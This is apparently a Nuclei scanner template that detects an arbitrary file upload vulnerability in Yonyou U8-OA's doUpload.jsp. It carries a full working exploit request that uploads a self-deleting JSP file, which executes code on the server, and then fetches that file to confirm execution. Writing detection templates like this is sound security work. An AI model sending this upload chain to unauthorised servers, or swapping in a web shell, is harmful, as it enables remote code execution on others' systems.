id: yonyou-u8-doupload-fileupload

info:
  name: 用友U8-OA协同工作系统doUpload.jsp接口存在任意文件上传漏洞
  author: hugh
  severity: critical

variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{rand_base(16)}}"

http:
  - raw:
      - |
        POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 298
        Origin: {{BaseURL}}
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{boundary}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
        Accept: */*
        Cookie: JSESSIONID=1BDC1511726B24DF9B75FD554960F96A; JSESSIONID=0B4A41EA32B167EC5531DD0F78E4C10D
        Connection: close

        ------WebKitFormBoundary{{boundary}}
        Content-Disposition: form-data; name="myfile"; filename="{{filename}}.jsp"
        Content-Type: application/octet-stream

        <%out.println(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------WebKitFormBoundary{{boundary}}--

      - |
        GET /yyoa/portal/upload/{{jspuploadfilename}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36

    extractors:
      - type: regex
        name: jspuploadfilename
        part: body
        group: 1
        internal: true
        regex:
          - 'window.returnValue = "(.*?)"'

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200 && contains((body_1), 'window.returnValue') && contains((body_2), '12321')"